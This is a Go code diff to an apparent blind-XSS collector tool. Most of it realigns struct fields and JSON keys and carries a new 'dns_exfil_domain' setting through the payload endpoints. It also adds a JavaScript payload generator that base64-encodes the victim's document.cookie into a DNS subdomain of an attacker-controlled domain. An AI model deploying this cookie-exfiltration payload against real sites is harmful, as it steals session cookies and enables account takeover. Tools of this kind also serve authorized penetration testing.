@@ -27,9 +27,9 @@ type XssHandler struct {
 	logger *zap.Logger
 	audit  *audit.Service
 	// collectorMu guards the collector HTTP server lifecycle
-	collectorMu      sync.RWMutex
-	collectorCancel  context.CancelFunc
-	collectorSrv     *http.Server
+	collectorMu     sync.RWMutex
+	collectorCancel context.CancelFunc
+	collectorSrv    *http.Server
 }
 
 // SetAudit wires platform audit logging.
@@ -144,6 +144,16 @@ func (h *XssHandler) ServeCollectorJS(w http.ResponseWriter, r *http.Request, to
 // The collector returns a 1x1 transparent GIF so the browser handles the
 // response without any visible side-effect.
 func (h *XssHandler) renderCollectorJS(payload *database.XssPayload) string {
+	// DNS exfiltration mode: base64-encode cookie into a DNS subdomain.
+	// ~60 bytes. Victim browser resolves <b64(cookie)>.domain -> DNS log captures it.
+	dnsDomain := payload.DNSExfilDomain
+	if dnsDomain == "" {
+		dnsDomain = h.cfg.DNSExfilDomain
+	}
+	if dnsDomain != "" {
+		return fmt.Sprintf(`(new Image()).src="http://"+btoa(document.cookie)+".%s"`, dnsDomain)
+	}
+	// Default HTTP image-beacon — ~75 bytes
 	publicURL := strings.TrimRight(h.cfg.PublicURL, "/")
 	if publicURL == "" {
 		publicURL = "http://" + h.cfg.BindHost
@@ -230,10 +240,11 @@ func (h *XssHandler) ServeCollectorGIF(w http.ResponseWriter, r *http.Request, t
 // GetConfig returns the XSS collector configuration for the admin UI.
 func (h *XssHandler) GetConfig(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{
-		"enabled":         h.cfg.Enabled,
-		"bind_host":       h.cfg.BindHost,
-		"bind_port":       h.cfg.BindPort,
-		"public_url":      h.cfg.PublicURL,
+		"enabled":          h.cfg.Enabled,
+		"bind_host":        h.cfg.BindHost,
+		"bind_port":        h.cfg.BindPort,
+		"public_url":       h.cfg.PublicURL,
+		"dns_exfil_domain": h.cfg.DNSExfilDomain,
 		"cooldown_seconds": h.cfg.CooldownSeconds,
 	})
 }
@@ -248,21 +259,22 @@ func (h *XssHandler) ListPayloads(c *gin.Context) {
 	result := make([]gin.H, len(payloads))
 	for i, p := range payloads {
 		result[i] = gin.H{
-			"id":            p.ID,
-			"token":         p.Token,
-			"name":          p.Name,
-			"type":          p.Type,
-			"payload":       p.Payload,
-			"config":        string(p.Config),
-			"project_id":    p.ProjectID,
-			"enabled":       p.Enabled == 1,
-			"description":   p.Description,
-			"domain":        p.Domain,
-			"domain_only":   p.DomainOnly,
-			"created_at":    p.CreatedAt,
-			"updated_at":    p.UpdatedAt,
-			"created_by":    p.CreatedBy,
-			"capture_count": p.CaptureCount,
+			"id":               p.ID,
+			"token":            p.Token,
+			"name":             p.Name,
+			"type":             p.Type,
+			"payload":          p.Payload,
+			"config":           string(p.Config),
+			"project_id":       p.ProjectID,
+			"enabled":          p.Enabled == 1,
+			"description":      p.Description,
+			"domain":           p.Domain,
+			"domain_only":      p.DomainOnly,
+			"dns_exfil_domain": p.DNSExfilDomain,
+			"created_at":       p.CreatedAt,
+			"updated_at":       p.UpdatedAt,
+			"created_by":       p.CreatedBy,
+			"capture_count":    p.CaptureCount,
 		}
 	}
 	c.JSON(http.StatusOK, gin.H{"payloads": result})
@@ -271,15 +283,16 @@ func (h *XssHandler) ListPayloads(c *gin.Context) {
 // CreatePayload creates a new XSS payload.
 func (h *XssHandler) CreatePayload(c *gin.Context) {
 	var req struct {
-		Name        string `json:"name"`
-		Type        string `json:"type"`
-		Payload     string `json:"payload"`
-		Config      string `json:"config"`
-		ProjectID   string `json:"project_id"`
-		Enabled     *bool  `json:"enabled"`
-		Description string `json:"description"`
-		Domain      string `json:"domain"`
-		DomainOnly  *int   `json:"domain_only"`
+		Name           string `json:"name"`
+		Type           string `json:"type"`
+		Payload        string `json:"payload"`
+		Config         string `json:"config"`
+		ProjectID      string `json:"project_id"`
+		Enabled        *bool  `json:"enabled"`
+		Description    string `json:"description"`
+		Domain         string `json:"domain"`
+		DomainOnly     *int   `json:"domain_only"`
+		DNSExfilDomain string `json:"dns_exfil_domain"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -288,15 +301,16 @@ func (h *XssHandler) CreatePayload(c *gin.Context) {
 
 	token := database.GenerateXssToken()
 	p := &database.XssPayload{
-		Token:       token,
-		Name:        req.Name,
-		Type:        req.Type,
-		Payload:     req.Payload,
-		Config:      []byte(req.Config),
-		ProjectID:   strings.TrimSpace(req.ProjectID),
-		Enabled:     1,
-		Description: req.Description,
-		Domain:      req.Domain,
+		Token:          token,
+		Name:           req.Name,
+		Type:           req.Type,
+		Payload:        req.Payload,
+		Config:         []byte(req.Config),
+		ProjectID:      strings.TrimSpace(req.ProjectID),
+		Enabled:        1,
+		Description:    req.Description,
+		Domain:         req.Domain,
+		DNSExfilDomain: strings.TrimSpace(req.DNSExfilDomain),
 	}
 	if req.Enabled != nil {
 		if *req.Enabled {
@@ -335,9 +349,9 @@ func (h *XssHandler) CreatePayload(c *gin.Context) {
 		publicURL = fmt.Sprintf("http://%s:%d", h.cfg.BindHost, h.cfg.BindPort)
 	}
 	c.JSON(http.StatusOK, gin.H{
-		"id":              id,
-		"token":           token,
-		"public_url":      strings.TrimRight(publicURL, "/") + "/xss/" + token + ".js",
+		"id":         id,
+		"token":      token,
+		"public_url": strings.TrimRight(publicURL, "/") + "/xss/" + token + ".js",
 	})
 }
 
@@ -354,21 +368,22 @@ func (h *XssHandler) GetPayload(c *gin.Context) {
 		return
 	}
 	c.JSON(http.StatusOK, gin.H{
-		"id":            payload.ID,
-		"token":         payload.Token,
-		"name":          payload.Name,
-		"type":          payload.Type,
-		"payload":       payload.Payload,
-		"config":        string(payload.Config),
-		"project_id":    payload.ProjectID,
-		"enabled":       payload.Enabled == 1,
-		"description":   payload.Description,
-		"domain":        payload.Domain,
-		"domain_only":   payload.DomainOnly,
-		"created_at":    payload.CreatedAt,
-		"updated_at":    payload.UpdatedAt,
-		"created_by":    payload.CreatedBy,
-		"capture_count": payload.CaptureCount,
+		"id":               payload.ID,
+		"token":            payload.Token,
+		"name":             payload.Name,
+		"type":             payload.Type,
+		"payload":          payload.Payload,
+		"config":           string(payload.Config),
+		"project_id":       payload.ProjectID,
+		"enabled":          payload.Enabled == 1,
+		"description":      payload.Description,
+		"domain":           payload.Domain,
+		"domain_only":      payload.DomainOnly,
+		"dns_exfil_domain": payload.DNSExfilDomain,
+		"created_at":       payload.CreatedAt,
+		"updated_at":       payload.UpdatedAt,
+		"created_by":       payload.CreatedBy,
+		"capture_count":    payload.CaptureCount,
 	})
 }
 
